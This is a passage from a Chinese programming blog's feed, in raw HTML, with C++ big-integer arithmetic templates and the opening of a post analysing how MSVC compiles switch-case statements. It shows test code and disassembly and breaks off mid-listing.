class="line">    </span><br><span class="line">    <span class="comment">// A一定不小于B，初始时，没有借位</span></span><br><span class="line">    <span class="keyword">int</span> carry = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">        <span class="comment">// 初始时是个位进行相减，假设当前并没有借位，所以初始的借位值carry为0</span></span><br><span class="line">        <span class="keyword">int</span> tmp = A[i] - carry;</span><br><span class="line">        <span class="comment">// 当B还没减完时，需要继续减，变为A[i] - B[i]</span></span><br><span class="line">        <span class="keyword">if</span> (i &lt; B.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            tmp = tmp - B[i]; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 当A[i] - B[i]的值小于0时，则A[i + 1]需要减去1</span></span><br><span class="line">        <span class="comment">// 因此需要将借位标志carry记为1，在下次循环时将借位减掉</span></span><br><span class="line">        <span class="comment">// 下列分支其实可以进行优化</span></span><br><span class="line">        <span class="keyword">if</span> (tmp &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            carry = <span class="number">1</span>;</span><br><span class="line">            ans.<span class="built_in">push_back</span>((tmp + <span class="number">10</span>) % <span class="number">10</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            carry = <span class="number">0</span>;</span><br><span class="line">            ans.<span class="built_in">push_back</span>(tmp % <span class="number">10</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 如果高位都是0，则要将这些前导0都要删掉，如果最后结果就是0，则最后一个0不能弹出</span></span><br><span class="line">    <span class="keyword">while</span> (ans.<span class="built_in">size</span>() &gt; <span class="number">1</span> &amp;&amp; ans.<span class="built_in">back</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">        ans.<span class="built_in">pop_back</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述将两个数的各个位相减后的结果存储在结果数组中时，使用了分支结构。根据其功能以及取模操作%的数学含义，其实可以将上述分支取消掉，只保留计算借位标志carry的分支即可，变为：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 先利用大整数比较，来将问题转为A - B的情况</span></span><br><span class="line"><span class="comment">vector&lt;int&gt; ans;</span></span><br><span class="line"><span class="comment">// 比较A是否不小于大整数B</span></span><br><span class="line"><span class="comment">if (cmp(A, B) == true) &#123;</span></span><br><span class="line"><span class="comment">    ans = sub(A, B);</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">&#125; else &#123;</span></span><br><span class="line"><span class="comment">    ans = sub(B, A);</span></span><br><span class="line"><span class="comment">    printf(&quot;-&quot;);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">sub</span><span class="params">(<span class="keyword">const</span> vector&lt;<span class="keyword">int</span>&gt;&amp; A, <span class="keyword">const</span> vector&lt;<span class="keyword">int</span>&gt;&amp; B)</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; ans;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// A一定不小于B，初始时，没有借位</span></span><br><span class="line">    <span class="keyword">int</span> carry = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">        <span class="comment">// 初始时是个位进行相减，假设当前并没有借位，所以初始的借位值carry为0</span></span><br><span class="line">        <span class="keyword">int</span> tmp = A[i] - carry;</span><br><span class="line">        <span class="comment">// 当B还没减完时，需要继续减，变为A[i] - B[i]</span></span><br><span class="line">        <span class="keyword">if</span> (i &lt; B.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            tmp = tmp - B[i]; </span><br><span class="line">        &#125;</span><br><span class="line">       <span class="comment">// 当tmp &lt; 0 时，加上10取余没毛病；</span></span><br><span class="line">       <span class="comment">// 当tmp &gt;= 0时，由于10 % 10 == 0，所以不影响最终结果</span></span><br><span class="line">       <span class="comment">// 故存放的还是tmp % 10其本身，所以可以去掉那个分支结构</span></span><br><span class="line">       ans.<span class="built_in">push_back</span>((tmp + <span class="number">10</span>) % <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 当A[i] - B[i]的值小于0时，则A[i + 1]需要减去1</span></span><br><span class="line">        <span class="comment">// 因此需要将借位标志carry记为1，在下次循环时将借位减掉</span></span><br><span class="line">        <span class="keyword">if</span> (tmp &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            carry = <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            carry = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 如果高位都是0，则要将这些前导0都要删掉，如果最后结果就是0，则最后一个0不能弹出</span></span><br><span class="line">    <span class="keyword">while</span> (ans.<span class="built_in">size</span>() &gt; <span class="number">1</span> &amp;&amp; ans.<span class="built_in">back</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">        ans.<span class="built_in">pop_back</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="大整数乘法-2">大整数乘法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">mul</span><span class="params">(<span class="keyword">const</span> vector&lt;<span class="keyword">int</span>&gt;&amp; A, <span class="keyword">const</span> <span class="keyword">int</span>&amp; B)</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; ans;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 当A的各个位都已经乘完乘数后，如果还有进位</span></span><br><span class="line">    <span class="comment">// 则将进位的整数分解成若干个整数存放到答案数组中</span></span><br><span class="line">    <span class="comment">// 因为A[i] * B的进位可以不只是1位数，可能是多位的整数</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>() || result; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; A.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            result += A[i] * B;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 求当前位置上应该留下的值</span></span><br><span class="line">        ans.<span class="built_in">push_back</span>(result % <span class="number">10</span>);</span><br><span class="line">        <span class="comment">// 求进位了多少值，与加法的很类似，但是加法最多进位是1</span></span><br><span class="line">        <span class="comment">// 而大整数乘法它的进位不一定是1，可能是具有若干个位的整数</span></span><br><span class="line">        result = result / <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 如果B为0，则需要将前导0去除，其实这个特殊情况可以放到函数入口处先判断</span></span><br><span class="line">    <span class="comment">// 可以不进入那个循环，提升效率</span></span><br><span class="line">    <span class="keyword">while</span> (ans.<span class="built_in">size</span>() &gt; <span class="number">1</span> &amp;&amp; ans.<span class="built_in">back</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">        ans.<span class="built_in">pop_back</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将上述代码优化后，可以提升效率：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">mul</span><span class="params">(<span class="keyword">const</span> vector&lt;<span class="keyword">int</span>&gt;&amp; A, <span class="keyword">const</span> <span class="keyword">int</span>&amp; B)</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; ans;</span><br><span class="line">    <span class="keyword">if</span> (B == <span class="number">0</span>) &#123;</span><br><span class="line">        ans.<span class="built_in">push_back</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 当A的各个位都已经乘完乘数后，如果还有进位</span></span><br><span class="line">    <span class="comment">// 则将进位的整数分解成若干个整数存放到答案数组中</span></span><br><span class="line">    <span class="comment">// 因为A[i] * B的进位可以不只是1位数，可能是多位的整数</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>() || result; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; A.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            result += A[i] * B;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 求当前位置上应该留下的值</span></span><br><span class="line">        ans.<span class="built_in">push_back</span>(result % <span class="number">10</span>);</span><br><span class="line">        <span class="comment">// 求进位了多少值</span></span><br><span class="line">        result = result / <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码的for循环的终止条件使用了一个或条件，其为了省略一个循环，如果不添加或条件，需要额外添加一个循环如下所示：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">mul</span><span class="params">(<span class="keyword">const</span> vector&lt;<span class="keyword">int</span>&gt;&amp; A, <span class="keyword">const</span> <span class="keyword">int</span>&amp; B)</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; ans;</span><br><span class="line">    <span class="keyword">if</span> (B == <span class="number">0</span>) &#123;</span><br><span class="line">        ans.<span class="built_in">push_back</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 当A的各个位都已经乘完乘数后，如果还有进位</span></span><br><span class="line">    <span class="comment">// 则将进位的整数分解成若干个整数存放到答案数组中</span></span><br><span class="line">    <span class="comment">// 因为A[i] * B的进位可以不只是1位数，可能是多位的整数</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">        result += A[i] * B;</span><br><span class="line">        <span class="comment">// 求当前位置上应该留下的值</span></span><br><span class="line">        ans.<span class="built_in">push_back</span>(result % <span class="number">10</span>);</span><br><span class="line">        <span class="comment">// 求进位了多少值</span></span><br><span class="line">        result = result / <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">while</span> (result) &#123;</span><br><span class="line">          ans.<span class="built_in">push_back</span>(result % <span class="number">10</span>);</span><br><span class="line">          result = result / <span class="number">10</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="大整数除法-2">大整数除法</h2><p>要求除数一定不为0，且A为高精度整数，b为低精度整数，且A和b都为非负数，A不小于b。</p><p>其实思想很简单，就是模拟竖式除法。模拟的方法有很多，但是其中比较简单的一个思路是从余数下手。设除数为B，余数为r，商为q，从被除数的最高位开始计算，有：</p><ul><li>竖式除法中，每次运算求出一位商的时候，都是先计算上一步运算后得到的余数。而当前的余数应该是<img src="https://math.now.sh?inline=r_i%20%3D%20r_%7Bi%20-%201%7D%20*%2010%20%2B%20A_i" style="display:inline-block;margin: 0;"/></li><li>根据当前的余数，计算当前步的商和余数，其中商为<img src="https://math.now.sh?inline=r_i%20%2F%20B" style="display:inline-block;margin: 0;"/>，余数为<img src="https://math.now.sh?inline=r_i%20%5C%25%20B" style="display:inline-block;margin: 0;"/></li><li>不断的根据上面的步骤来进行迭代，直到被除数的每一位都参与运算过</li></ul><p>计算完毕后，由于大整数存储是按照小端方式存放，因此需要将结果逆置后再输出。</p><p>代码模板为：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">div</span><span class="params">(<span class="keyword">const</span> vector&lt;<span class="keyword">int</span>&gt;&amp; A, <span class="keyword">int</span> b, <span class="keyword">int</span>&amp; r)</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; q;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// r为余数，且为哨兵</span></span><br><span class="line">    r = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = A.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i)</span><br><span class="line">    &#123;</span><br><span class="line">        r = r * <span class="number">10</span> + A[i];</span><br><span class="line">        q.<span class="built_in">push_back</span>(r / b);</span><br><span class="line">        r = r % b;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 由于大整数的存储是按照小端序存储的，因此需要将最后的结果逆置</span></span><br><span class="line">    <span class="built_in">reverse</span>(q.<span class="built_in">begin</span>(), q.<span class="built_in">end</span>());</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 去除前导0</span></span><br><span class="line">    <span class="keyword">while</span> (q.<span class="built_in">size</span>() &gt; <span class="number">1</span> &amp;&amp; q.<span class="built_in">back</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">        q.<span class="built_in">pop_back</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> q;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;高精度大整数运算&lt;/h1&gt;
&lt;p&gt;只针对C++来说，因为C++没有大整数类，而java具有大整数类，python的整数是无限位的&lt;/p&gt;
&lt;p&gt;对于大数运算，一般有以下几种情况：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;img src=&quot;https://math.now.sh?inl</summary>
      
    
    
    
    <category term="算法" scheme="https://4st.tech/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="高精度" scheme="https://4st.tech/tags/%E9%AB%98%E7%B2%BE%E5%BA%A6/"/>
    
    <category term="加法" scheme="https://4st.tech/tags/%E5%8A%A0%E6%B3%95/"/>
    
    <category term="减法" scheme="https://4st.tech/tags/%E5%87%8F%E6%B3%95/"/>
    
    <category term="乘法" scheme="https://4st.tech/tags/%E4%B9%98%E6%B3%95/"/>
    
    <category term="除法" scheme="https://4st.tech/tags/%E9%99%A4%E6%B3%95/"/>
    
    <category term="大整数运算" scheme="https://4st.tech/tags/%E5%A4%A7%E6%95%B4%E6%95%B0%E8%BF%90%E7%AE%97/"/>
    
    <category term="大整数加法" scheme="https://4st.tech/tags/%E5%A4%A7%E6%95%B4%E6%95%B0%E5%8A%A0%E6%B3%95/"/>
    
    <category term="大整数减法" scheme="https://4st.tech/tags/%E5%A4%A7%E6%95%B4%E6%95%B0%E5%87%8F%E6%B3%95/"/>
    
    <category term="大整数乘法" scheme="https://4st.tech/tags/%E5%A4%A7%E6%95%B4%E6%95%B0%E4%B9%98%E6%B3%95/"/>
    
    <category term="大整数除法" scheme="https://4st.tech/tags/%E5%A4%A7%E6%95%B4%E6%95%B0%E9%99%A4%E6%B3%95/"/>
    
    <category term="C++大整数运算" scheme="https://4st.tech/tags/C-%E5%A4%A7%E6%95%B4%E6%95%B0%E8%BF%90%E7%AE%97/"/>
    
  </entry>
  
  <entry>
    <title>C++逆向：switch-case逆向分析与还原</title>
    <link href="https://4st.tech/2021/08/07/switch-case-ni-xiang-fen-xi-yu-huan-yuan/"/>
    <id>https://4st.tech/2021/08/07/switch-case-ni-xiang-fen-xi-yu-huan-yuan/</id>
    <published>2021-08-07T04:51:38.000Z</published>
    <updated>2021-09-01T05:11:32.172Z</updated>
    
    <content type="html"><![CDATA[<h1>大纲</h1><ul><li>case的数量小于等于3个，且case值连续</li><li>case的数量大于3个，但case值较为连续，即：最大case值和最小case值之间的间隔不大于7</li><li>case的数量大于3个，且case值相隔较大，且最大case值和最小case值之间的间隔不能超过255</li><li>case的值大于3个，且case值较为离散。</li><li>混合方案。当不能单独用上述4种优化方案时使用。当个数小于等于3个，直接比较就行了，就不再进行折半查找了。</li></ul><h1>测试环境</h1><p>MSVC + VC6 + Release，速度优先编译选项。选用VC6的原因是编译器没有其他额外的操作，如：安全cookie之类的信息，方便观察。其实switch-case的这几种方式在VS2019中也是一样的</p><h1>优化方案一：直接if-else</h1><p>适用于：case的数量小于等于3个，且case值连续的情况。</p><p>测试代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in"><span class="keyword">switch</span></span> (argc)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;case 1&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;case 2&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;case 3&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">.text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00401000 _main           proc near               ; CODE XREF: start+AFp</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000 arg_0           = dword ptr  4</span><br><span class="line">.text:00401000</span><br><span class="line">.text:00401000                 mov     eax, [esp+arg_0]</span><br><span class="line">.text:00401004                 dec     eax</span><br><span class="line">.text:00401005                 jz      short LBL_CASE1</span><br><span class="line">.text:00401005</span><br><span class="line">.text:00401007                 dec     eax</span><br><span class="line">.text:00401008                 jz      short LBL_CASE2</span><br><span class="line">.text:00401008</span><br><span class="line">.text:0040100A                 dec     eax</span><br><span class="line">.text:0040100B                 jnz     short LBL_EXIT</span><br><span class="line">.text:0040100D LBL_CASE3:                              ; &quot;case 3&quot;</span><br><span class="line">.text:0040100D                 push    offset s-&gt;Case3</span><br><span class="line">.text:00401012                 call    printf</span><br><span class="line">.text:00401012</span><br><span class="line">.text:00401017                 add     esp, 4</span><br><span class="line">.text:0040101A                 xor     eax, eax</span><br><span class="line">.text:0040101C                 retn</span><br><span class="line">.text:0040101C</span><br><span class="line">.text:0040101D ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040101D</span><br><span class="line">.text:0040101D LBL_CASE2:                              ; CODE XREF: _main+8j</span><br><span class="line">.text:0040101D                 push    offset s-&gt;Case2 ; &quot;case 2&quot;</span><br><span class="line">.text:00401022                 call    printf</span><br><span class="line">.text:00401022</span><br><span class="line">.text:00401027                 add     esp, 4</span><br><span class="line">.text:0040102A                 xor     eax, eax</span><br><span class="line">.text:0040102C                 retn</span><br><span class="line">.text:0040102C</span><br><span class="line">.text:0040102D ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040102D</span><br><span class="line">.text:0040102D LBL_CASE1:                              ; CODE XREF: _main+5j</span><br><span class="line">.text:0040102D                 push    offset s-&gt;Case1 ; &quot;case 1&quot;</span><br><span class="line">.text:00401032                 call    printf</span><br><span class="line">.text:00401032</span><br><span class="line">.text:00401037                 add     esp, 4</span><br><span class="line">.text:00401037</span><br><span class="line">.text:0040103A</span><br><span class="line">.text:0040103A LBL_EXIT:                               ; CODE XREF: _main+Bj</span><br><span class="line">.text:0040103A                 xor     eax, eax</span><br><span class="line">.text:0040103C                 retn</span><br><span class="line">.text:0040103C</span><br><span class="line">.text:0040103C _main           endp</span><br></pre></td></tr></table></figure><p>可以发现，其为了提高速度，其直接将共有的退出代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xor     eax, eax</span><br><span class="line">retn</span><br></pre></td></tr></table></figure><p>放到了各个case后面，直接退出了。</p><p>其在比较到底是选择哪个case的时候，与if-else的差不多：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cmp xxxx</span><br><span class="line">jz xxxx; 跳转到对应的case代码块</span><br><span class="line">cmp xxxx</span><br><span class="line">jz xxxx</span><br><span class="line">cmp xxxx</span><br><span class="line">jnz xxxx; default / case_end</span><br></pre></td></tr></table></figure><p>当没有break的时候，则生成的引导表是按照你写的顺序；如果有break，则顺序就无所谓了。</p><h1>优化方案二：跳转表方案</h1><p>适用于：case的数量大于3个，但case值较为连续，即：最大case值和最小case值之间的间隔不大于7的情况。</p><p>实验代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (argc)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;case 1&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;case 2&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;case 3&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;case 4&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;            </span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;case 5&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;            </span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;case 6&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;          </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;default&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 